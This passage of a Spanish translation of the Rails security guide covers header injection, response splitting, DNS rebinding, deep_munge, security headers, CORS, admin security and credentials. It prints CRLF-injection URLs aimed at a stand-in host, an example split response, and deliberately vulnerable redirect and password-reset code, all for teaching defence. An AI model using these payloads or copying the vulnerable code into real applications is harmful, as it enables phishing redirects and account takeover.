ADVERTENCIA: _Las cabeceras HTTP se generan dinámicamente y bajo ciertas circunstancias, la entrada del usuario puede ser inyectada. Esto puede llevar a redirecciones falsas, XSS o división de respuestas HTTP._

Las cabeceras de solicitud HTTP tienen un campo Referer, User-Agent (software del cliente) y Cookie, entre otros. Las cabeceras de respuesta, por ejemplo, tienen un código de estado, Cookie y un campo de ubicación (URL de destino de redirección). Todas ellas son proporcionadas por el usuario y pueden ser manipuladas con más o menos esfuerzo. _Recuerde escapar también estos campos de cabecera_. Por ejemplo, cuando muestra el agente de usuario en un área de administración.
Además de eso, es importante saber lo que estás haciendo al construir encabezados de respuesta basados en parte en la entrada del usuario. Por ejemplo, si quieres redirigir al usuario de vuelta a una página específica. Para hacer eso, has introducido un campo "referer" en un formulario para redirigir a la dirección dada:

```ruby
redirect_to params[:referer]
```

Lo que sucede es que Rails coloca la cadena en el campo de encabezado `Location` y envía un estado 302 (redirección) al navegador. Lo primero que haría un usuario malintencionado es esto:

```
http://www.tuaplicacion.com/controlador/accion?referer=http://www.malicioso.tld
```

Y debido a un error en (Ruby y) Rails hasta la versión 2.1.2 (excluyéndola), un hacker puede inyectar campos de encabezado arbitrarios; por ejemplo, así:

```
http://www.tuaplicacion.com/controlador/accion?referer=http://www.malicioso.tld%0d%0aX-Header:+Hola!
http://www.tuaplicacion.com/controlador/accion?referer=ruta/en/tu/aplicacion%0d%0aLocation:+http://www.malicioso.tld
```

Ten en cuenta que `%0d%0a` está codificado en URL como `\r\n`, que es un retorno de carro y un salto de línea (CRLF) en Ruby. Entonces, el encabezado HTTP resultante para el segundo ejemplo será el siguiente porque el segundo campo de encabezado de ubicación sobrescribe al primero.

```http
HTTP/1.1 302 Movido Temporalmente
(...)
Location: http://www.malicioso.tld
```

Por lo tanto, los vectores de ataque para la inyección de encabezados se basan en la inyección de caracteres CRLF en un campo de encabezado. ¿Y qué podría hacer un atacante con una redirección falsa? Podrían redirigir a un sitio de phishing que se ve igual que el tuyo, pero solicita iniciar sesión nuevamente (y envía las credenciales de inicio de sesión al atacante). O podrían instalar software malicioso a través de agujeros de seguridad del navegador en ese sitio. Rails 2.1.2 escapa estos caracteres para el campo de ubicación en el método `redirect_to`. Asegúrate de hacerlo tú mismo al construir otros campos de encabezado con entrada de usuario.

#### Rebinding DNS y ataques de encabezado de host

Rebinding DNS es un método de manipulación de la resolución de nombres de dominio que se utiliza comúnmente como una forma de ataque informático. Rebinding DNS evita la política de mismo origen abusando del Sistema de Nombres de Dominio (DNS). Vuelve a enlazar un dominio a una dirección IP diferente y luego compromete el sistema ejecutando código aleatorio contra tu aplicación Rails desde la dirección IP modificada.

Se recomienda utilizar el middleware `ActionDispatch::HostAuthorization` para protegerse contra el rebinding DNS y otros ataques de encabezado de host. Está habilitado de forma predeterminada en el entorno de desarrollo, pero debes activarlo en producción y otros entornos configurando la lista de hosts permitidos. También puedes configurar excepciones y establecer tu propia aplicación de respuesta.

```ruby
Rails.application.config.hosts << "producto.com"

Rails.application.config.host_authorization = {
  # Excluir solicitudes para la ruta /healthcheck/ de la verificación de host
  exclude: ->(request) { request.path =~ /healthcheck/ }
  # Agregar aplicación Rack personalizada para la respuesta
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Solicitud incorrecta"]]
  end
}
```

Puedes leer más al respecto en la documentación del middleware [`ActionDispatch::HostAuthorization`](/configuring.html#actiondispatch-hostauthorization)

#### División de respuesta

Si la inyección de encabezados fuera posible, también podría ser posible la división de respuesta. En HTTP, el bloque de encabezado va seguido de dos CRLFs y los datos reales (generalmente HTML). La idea de la división de respuesta es inyectar dos CRLFs en un campo de encabezado, seguido de otra respuesta con HTML malicioso. La respuesta sería:

```http
HTTP/1.1 302 Encontrado [Primera respuesta estándar 302]
Fecha: mar, 12 abr 2005 22:09:07 GMT
Ubicación: Tipo de contenido: text/html


HTTP/1.1 200 OK [Segunda nueva respuesta creada por el atacante comienza]
Tipo de contenido: text/html


&lt;html&gt;&lt;font color=red&gt;hola&lt;/font&gt;&lt;/html&gt; [La entrada maliciosa arbitraria se muestra como la página redirigida]
Keep-Alive: timeout=15, max=100
Conexión: Keep-Alive
Transfer-Encoding: chunked
Tipo de contenido: text/html
```

Bajo ciertas circunstancias, esto presentaría el HTML malicioso a la víctima. Sin embargo, esto solo parece funcionar con conexiones Keep-Alive (y muchos navegadores utilizan conexiones de una sola vez). Pero no puedes confiar en esto. En cualquier caso, esto es un error grave y debes actualizar tu versión de Rails a la versión 2.0.5 o 2.1.2 para eliminar los riesgos de inyección de encabezados (y, por lo tanto, de división de respuesta).

Generación insegura de consultas
--------------------------------

Debido a la forma en que Active Record interpreta los parámetros en combinación con la forma en que Rack analiza los parámetros de consulta, era posible emitir consultas inesperadas a la base de datos con cláusulas `IS NULL`. Como respuesta a ese problema de seguridad ([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ), [CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) y [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)), se introdujo el método `deep_munge` como solución para mantener Rails seguro de forma predeterminada.

Un ejemplo de código vulnerable que podría ser utilizado por un atacante, si no se realizara `deep_munge`, es:

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

Cuando `params[:token]` es uno de los siguientes: `[nil]`, `[nil, nil, ...]` o `['foo', nil]`, pasará la prueba de `nil`, pero aún se agregarán cláusulas `IS NULL` o `IN ('foo', NULL)` a la consulta SQL.
Para mantener Rails seguro por defecto, `deep_munge` reemplaza algunos de los valores con `nil`. La siguiente tabla muestra cómo se ven los parámetros en función del `JSON` enviado en la solicitud:

| JSON                              | Parámetros               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

Es posible volver al comportamiento anterior y deshabilitar `deep_munge` configurando tu aplicación si eres consciente del riesgo y sabes cómo manejarlo:

```ruby
config.action_dispatch.perform_deep_munge = false
```

Encabezados de seguridad HTTP
---------------------

Para mejorar la seguridad de tu aplicación, Rails se puede configurar para devolver encabezados de seguridad HTTP. Algunos encabezados están configurados por defecto; otros deben configurarse explícitamente.

### Encabezados de seguridad por defecto

Por defecto, Rails está configurado para devolver los siguientes encabezados de respuesta. Tu aplicación devuelve estos encabezados para cada respuesta HTTP.

#### `X-Frame-Options`

El encabezado [`X-Frame-Options`][] indica si un navegador puede representar la página en una etiqueta `<frame>`, `<iframe>`, `<embed>` u `<object>`. Este encabezado se establece en `SAMEORIGIN` de forma predeterminada para permitir el enmarcado solo en el mismo dominio. Establécelo en `DENY` para denegar completamente el enmarcado, o elimina este encabezado por completo si deseas permitir el enmarcado en todos los dominios.

#### `X-XSS-Protection`

Un encabezado [obsoleto](https://owasp.org/www-project-secure-headers/#x-xss-protection) y heredado, establecido en `0` en Rails de forma predeterminada para desactivar los auditores XSS heredados problemáticos.

#### `X-Content-Type-Options`

El encabezado [`X-Content-Type-Options`][] se establece en `nosniff` en Rails de forma predeterminada. Evita que el navegador adivine el tipo MIME de un archivo.

#### `X-Permitted-Cross-Domain-Policies`

Este encabezado se establece en `none` en Rails de forma predeterminada. Prohíbe que los clientes de Adobe Flash y PDF incrusten tu página en otros dominios.

#### `Referrer-Policy`

El encabezado [`Referrer-Policy`][] se establece en `strict-origin-when-cross-origin` en Rails de forma predeterminada. Para solicitudes de origen cruzado, esto solo envía el origen en el encabezado Referer. Esto evita fugas de datos privados que pueden ser accesibles desde otras partes de la URL completa, como la ruta y la cadena de consulta.

#### Configuración de los encabezados por defecto

Estos encabezados se configuran de forma predeterminada de la siguiente manera:

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '0',
  'X-Content-Type-Options' => 'nosniff',
  'X-Permitted-Cross-Domain-Policies' => 'none',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}
```

Puedes anular estos o agregar encabezados adicionales en `config/application.rb`:

```ruby
config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
config.action_dispatch.default_headers['Header-Name']     = 'Value'
```

O puedes eliminarlos:

```ruby
config.action_dispatch.default_headers.clear
```

### Encabezado `Strict-Transport-Security`

El encabezado de respuesta HTTP [`Strict-Transport-Security`][] (HTST) asegura que el navegador se actualice automáticamente a HTTPS para conexiones actuales y futuras.

El encabezado se agrega a la respuesta al habilitar la opción `force_ssl`:

```ruby
  config.force_ssl = true
```

### Encabezado `Content-Security-Policy`

Para ayudar a proteger contra ataques XSS e inyecciones, se recomienda definir un encabezado de respuesta [`Content-Security-Policy`][] para tu aplicación. Rails proporciona un DSL que te permite configurar el encabezado.

Define la política de seguridad en el inicializador correspondiente:

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # Especifica la URI para los informes de violación
  policy.report_uri "/csp-violation-report-endpoint"
end
```

La política configurada globalmente se puede anular en una base de recursos por recurso:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

O se puede deshabilitar:

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

Utiliza lambdas para inyectar valores por solicitud, como subdominios de cuenta en una aplicación multiinquilino:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```

#### Informes de violaciones

Habilita la directiva [`report-uri`][] para informar las violaciones a la URI especificada:

```ruby
Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end
```

Cuando migres contenido heredado, es posible que desees informar las violaciones sin hacer cumplir la política. Establece el encabezado de respuesta [`Content-Security-Policy-Report-Only`][] para informar solo las violaciones:

```ruby
Rails.application.config.content_security_policy_report_only = true
```

O anúlalo en un controlador:

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

#### Agregar un Nonce

Si estás considerando `'unsafe-inline'`, considera usar nonces en su lugar. [Los nonces proporcionan una mejora sustancial](https://www.w3.org/TR/CSP3/#security-nonces) sobre `'unsafe-inline'` al implementar una Política de Seguridad de Contenido sobre código existente.
```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

Hay algunos compromisos a considerar al configurar el generador de nonce.
Usar `SecureRandom.base64(16)` es un buen valor predeterminado, porque generará un nuevo nonce aleatorio para cada solicitud. Sin embargo, este método es incompatible con [caché GET condicional](caching_with_rails.html#conditional-get-support) porque los nuevos nonces darán como resultado nuevos valores de ETag para cada solicitud. Una alternativa a los nonces aleatorios por solicitud sería usar el ID de sesión:

```ruby
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

Este método de generación es compatible con ETags, sin embargo, su seguridad depende de que el ID de sesión sea suficientemente aleatorio y no se exponga en cookies inseguras.

De forma predeterminada, los nonces se aplicarán a `script-src` y `style-src` si se define un generador de nonce. `config.content_security_policy_nonce_directives` se puede usar para cambiar qué directivas usarán nonces:

```ruby
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
```

Una vez que se haya configurado la generación de nonces en un inicializador, los valores de nonce automáticos se pueden agregar a las etiquetas de script pasando `nonce: true` como parte de `html_options`:

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('¡Hola, mundo!');
<% end -%>
```

Lo mismo funciona con `javascript_include_tag`:

```html+erb
<%= javascript_include_tag "script", nonce: true %>
```

Use el ayudante [`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)
para crear una etiqueta meta "csp-nonce" con el valor de nonce por sesión
para permitir etiquetas `<script>` en línea.

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

Esto se utiliza por el ayudante Rails UJS para crear elementos `<script>` en línea cargados dinámicamente.

### Encabezado `Feature-Policy`

NOTA: El encabezado `Feature-Policy` se ha renombrado a `Permissions-Policy`.
El `Permissions-Policy` requiere una implementación diferente y no está
compatible con todos los navegadores. Para evitar tener que cambiar el nombre de este
middleware en el futuro, usamos el nuevo nombre para el middleware pero
mantenemos el nombre y la implementación anterior del encabezado por ahora.

Para permitir o bloquear el uso de funciones del navegador, puede definir un encabezado de respuesta [`Feature-Policy`][]
para su aplicación. Rails proporciona un DSL que le permite configurar el encabezado.

Defina la política en el inicializador correspondiente:

```ruby
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

La política configurada globalmente se puede anular en cada recurso:

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```


### Compartir recursos de origen cruzado

Los navegadores restringen las solicitudes HTTP de origen cruzado iniciadas desde scripts. Si
desea ejecutar Rails como una API y ejecutar una aplicación frontend en un dominio separado,
necesitará habilitar [Compartir recursos de origen cruzado](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (CORS).

Puede usar el middleware [Rack CORS](https://github.com/cyu/rack-cors) para manejar CORS. Si ha generado su aplicación con la opción `--api`,
es probable que Rack CORS ya esté configurado y puede omitir los siguientes pasos.

Para comenzar, agregue la gema rack-cors a su Gemfile:

```ruby
gem 'rack-cors'
```

A continuación, agregue un inicializador para configurar el middleware:

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, "Rack::Cors" do
  allow do
    origins 'example.com'

    resource '*',
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

Seguridad de intranet y administración
--------------------------------------

Las intranets y las interfaces de administración son objetivos populares de ataques, porque permiten el acceso privilegiado. Aunque esto requeriría varias medidas de seguridad adicionales, en el mundo real ocurre lo contrario.

En 2007, hubo el primer troyano hecho a medida que robó información de una intranet, concretamente el sitio web "Monster for employers" de Monster.com, una aplicación web de reclutamiento en línea. Los troyanos hechos a medida son muy raros hasta ahora y el riesgo es bastante bajo, pero ciertamente es una posibilidad y un ejemplo de cómo la seguridad del host del cliente también es importante. Sin embargo, la mayor amenaza para las aplicaciones de intranet y administración son XSS y CSRF.

### Cross-Site Scripting

Si su aplicación vuelve a mostrar la entrada de usuario malintencionada desde la extranet, la aplicación será vulnerable a XSS. Los nombres de usuario, comentarios, informes de spam, direcciones de pedido son solo algunos ejemplos poco comunes donde puede haber XSS.

Tener un solo lugar en la interfaz de administración o intranet donde la entrada no se haya saneado hace que toda la aplicación sea vulnerable. Las posibles explotaciones incluyen robar la cookie del administrador privilegiado, inyectar un iframe para robar la contraseña del administrador o instalar software malicioso a través de agujeros de seguridad del navegador para tomar el control de la computadora del administrador.

Consulte la sección de Inyección para conocer las medidas de seguridad contra XSS.

### Cross-Site Request Forgery
Cross-Site Request Forgery (CSRF), también conocido como Cross-Site Reference Forgery (XSRF), es un método de ataque gigantesco que permite al atacante hacer todo lo que el administrador o usuario de Intranet puede hacer. Como ya has visto anteriormente cómo funciona CSRF, aquí tienes algunos ejemplos de lo que los atacantes pueden hacer en la Intranet o en la interfaz de administración.

Un ejemplo del mundo real es la [reconfiguración de un enrutador mediante CSRF](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html). Los atacantes enviaron un correo electrónico malicioso, con CSRF incluido, a usuarios mexicanos. El correo electrónico afirmaba que había una tarjeta electrónica esperando al usuario, pero también contenía una etiqueta de imagen que resultaba en una solicitud HTTP-GET para reconfigurar el enrutador del usuario (que es un modelo popular en México). La solicitud cambió la configuración de DNS para que las solicitudes a un sitio bancario en México se mapearan al sitio del atacante. Todos los que accedieron al sitio bancario a través de ese enrutador vieron el sitio falso del atacante y les robaron sus credenciales.

Otro ejemplo cambió la dirección de correo electrónico y la contraseña de Google Adsense. Si la víctima estaba conectada a Google Adsense, la interfaz de administración de las campañas publicitarias de Google, un atacante podría cambiar las credenciales de la víctima.

Otro ataque popular es enviar spam a tu aplicación web, blog o foro para propagar XSS malicioso. Por supuesto, el atacante tiene que conocer la estructura de la URL, pero la mayoría de las URL de Rails son bastante directas o serán fáciles de descubrir si es una interfaz de administración de una aplicación de código abierto. El atacante incluso puede hacer 1,000 suposiciones afortunadas simplemente incluyendo etiquetas IMG maliciosas que prueben todas las combinaciones posibles.

Para _contramedidas contra CSRF en interfaces de administración y aplicaciones de Intranet, consulta las contramedidas en la sección de CSRF_.

### Precauciones adicionales

La interfaz de administración común funciona de la siguiente manera: se encuentra en www.example.com/admin, solo se puede acceder si se establece la bandera de administrador en el modelo de Usuario, vuelve a mostrar la entrada del usuario y permite al administrador eliminar/agregar/editar cualquier dato deseado. Aquí tienes algunas consideraciones al respecto:

* Es muy importante _pensar en el peor de los casos_: ¿Qué pasaría si alguien realmente obtuviera tus cookies o credenciales de usuario? Podrías _introducir roles_ para la interfaz de administración para limitar las posibilidades del atacante. ¿O qué tal si usas _credenciales de inicio de sesión especiales_ para la interfaz de administración, diferentes de las que se usan para la parte pública de la aplicación? ¿O una _contraseña especial para acciones muy serias_?

* ¿El administrador realmente tiene que acceder a la interfaz desde cualquier parte del mundo? Piensa en _limitar el inicio de sesión a un grupo de direcciones IP de origen_. Examina request.remote_ip para obtener la dirección IP del usuario. Esto no es infalible, pero es una gran barrera. Recuerda que podría haber un proxy en uso, sin embargo.

* _Coloca la interfaz de administración en un subdominio especial_ como admin.application.com y hazlo una aplicación separada con su propio sistema de gestión de usuarios. Esto hace que sea imposible robar una cookie de administrador del dominio habitual, www.application.com. Esto se debe a la política de mismo origen en tu navegador: un script inyectado (XSS) en www.application.com no puede leer la cookie de admin.application.com y viceversa.

Seguridad del entorno
----------------------

Está fuera del alcance de esta guía informarte sobre cómo asegurar el código de tu aplicación y los entornos. Sin embargo, asegura la configuración de tu base de datos, por ejemplo, `config/database.yml`, la clave maestra para `credentials.yml` y otros secretos no encriptados. Es posible que desees restringir aún más el acceso, utilizando versiones específicas del entorno de estos archivos y cualquier otro que pueda contener información sensible.

### Credenciales personalizadas

Rails almacena secretos en `config/credentials.yml.enc`, que está encriptado y, por lo tanto, no se puede editar directamente. Rails utiliza `config/master.key` o busca la variable de entorno `ENV["RAILS_MASTER_KEY"]` para encriptar el archivo de credenciales. Debido a que el archivo de credenciales está encriptado, se puede almacenar en control de versiones, siempre y cuando se mantenga segura la clave maestra.

Por defecto, el archivo de credenciales contiene el `secret_key_base` de la aplicación. También se puede utilizar para almacenar otros secretos como claves de acceso para API externas.

Para editar el archivo de credenciales, ejecuta `bin/rails credentials:edit`. Este comando creará el archivo de credenciales si no existe. Además, este comando creará `config/master.key` si no se ha definido una clave maestra.

Los secretos guardados en el archivo de credenciales son accesibles a través de `Rails.application.credentials`.
Por ejemplo, con el siguiente `config/credentials.yml.enc` descifrado:

```yaml
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

`Rails.application.credentials.some_api_key` devuelve `"SOMEKEY"`. `Rails.application.credentials.system.access_key_id` devuelve `"1234AB"`.
Si desea que se genere una excepción cuando alguna clave esté en blanco, puede utilizar la versión con signo de exclamación:

```ruby
# Cuando some_api_key está en blanco...
Rails.application.credentials.some_api_key! # => KeyError: :some_api_key está en blanco
```

CONSEJO: Obtenga más información sobre las credenciales con `bin/rails credentials:help`.

ADVERTENCIA: Mantenga segura su clave maestra. No la incluya en sus commits.

Gestión de dependencias y CVEs
------------------------------

No actualizamos las dependencias solo para fomentar el uso de nuevas versiones, incluso para problemas de seguridad. Esto se debe a que los propietarios de las aplicaciones deben actualizar manualmente sus gemas independientemente de nuestros esfuerzos. Utilice `bundle update --conservative gem_name` para actualizar de forma segura las dependencias vulnerables.

Recursos adicionales
--------------------

El panorama de seguridad cambia y es importante mantenerse actualizado, ya que pasar por alto una nueva vulnerabilidad puede ser catastrófico. Puede encontrar recursos adicionales sobre seguridad (en Rails) aquí:

* Suscríbase a la lista de correo de seguridad de Rails [mailing list](https://discuss.rubyonrails.org/c/security-announcements/9).
* [Brakeman - Escáner de seguridad para Rails](https://brakemanscanner.org/) - Para realizar análisis de seguridad estáticos en aplicaciones Rails.
* [Directrices de seguridad web de Mozilla](https://infosec.mozilla.org/guidelines/web_security.html) - Recomendaciones sobre temas que abarcan la Política de seguridad de contenido, encabezados HTTP, cookies, configuración de TLS, etc.
* Un [buen blog de seguridad](https://owasp.org/) que incluye la [Hoja de trucos de prevención de Cross-Site Scripting](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md).
[`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags
[`config.filter_parameters`]: configuring.html#config-filter-parameters
[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql
[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
[`Strict-Transport-Security`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
[`Content-Security-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
[`Feature-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy
